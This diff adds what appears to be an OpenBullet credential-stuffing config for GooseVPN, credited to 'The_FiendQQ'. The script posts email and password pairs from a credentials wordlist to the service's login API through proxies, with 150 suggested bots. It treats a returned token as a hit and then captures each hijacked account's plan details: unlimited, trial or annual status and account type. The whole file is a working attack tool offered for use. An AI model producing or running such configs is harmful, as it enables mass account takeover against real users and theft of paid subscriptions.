@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "GooseVPN.com",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-04T15:53:32.1792993+04:30",
+  "AdditionalInfo": "",
+  "Author": "\"The_FiendQQ\"",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api1.goosevpn.com/auth/email" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Host: api1.goosevpn.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"code\":\"E1101\"" 
+    KEY "\"message\":\"Unable to authenticate user with WHMCS server.\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"token" 
+
+#Token PARSE "<SOURCE>" JSON "token" -> VAR "Token" 
+
+#GetInfo REQUEST GET "https://api1.goosevpn.com/users/me/plan" 
+  
+  HEADER "Authorization: Bearer: <Token>" 
+  HEADER "Host: api1.goosevpn.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+
+#IsUnlimited PARSE "<SOURCE>" LR "is_unlimited\":" "," CreateEmpty=FALSE -> CAP "Is Unlimited" 
+
+#IsTrial PARSE "<SOURCE>" LR "is_trial\":" "," CreateEmpty=FALSE -> CAP "Is Trial" 
+
+#IsAnnual PARSE "<SOURCE>" LR "is_annual\":" "," CreateEmpty=FALSE -> CAP "Is Annual" 
+
+#Status PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "Status" 
+
+#AccountType PARSE "<SOURCE>" JSON "account_type" CreateEmpty=FALSE -> CAP "Account Type" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Status>" Contains "Cancelled" 
+    KEY "<Account Type>" Contains "whmcs" 
+
